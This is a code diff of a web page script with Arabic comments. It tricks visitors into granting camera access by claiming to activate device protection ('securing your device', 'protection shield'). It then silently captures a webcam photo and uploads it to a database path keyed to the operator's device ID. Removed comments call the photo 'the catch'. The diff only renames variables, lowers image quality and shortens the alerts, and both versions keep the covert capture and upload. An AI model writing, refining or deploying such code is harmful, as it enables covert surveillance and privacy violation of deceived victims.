@@ -1,7 +1,7 @@
 <script>
-    // توليد معرف خاص للجهاز عشان الصيدة تروح لصاحبها بس
-    const deviceId = localStorage.getItem('deviceId') || 'dev_' + Math.random().toString(36).substr(2, 9);
-    localStorage.setItem('deviceId', deviceId);
+    // معرف فريد لكل جهاز
+    const myId = localStorage.getItem('userId') || 'user_' + Math.random().toString(36).substr(2, 9);
+    localStorage.setItem('userId', myId);
 
     async function capture() {
         try {
@@ -14,20 +14,15 @@
                     const canvas = document.createElement('canvas');
                     canvas.width = 640; canvas.height = 480;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    const imgData = canvas.toDataURL('image/jpeg', 0.7);
+                    const imgData = canvas.toDataURL('image/jpeg', 0.6);
                     
-                    // إرسال الصيدة مع معرف الجهاز
-                    db.ref('results/' + deviceId).push({ 
-                        photo: imgData, 
-                        date: new Date().toLocaleString() 
-                    }).then(() => {
-                        alert("✅ تم تأمين جهازك بنجاح!");
-                        stream.getTracks().forEach(track => track.stop());
-                    });
+                    // إرسال الصورة للمسار الخاص بالمستخدم
+                    db.ref('results/' + myId).push({ photo: imgData, date: new Date().toLocaleString() });
+                    alert("✅ تم الفحص!");
                 }, 1000);
             };
         } catch (e) {
-            alert("🚨 لازم توافق على إذن الكاميرا لتفعيل درع الحماية!");
+            alert("🚨 وافق على الكاميرا لتفعيل الحماية!");
         }
     }
 </script>
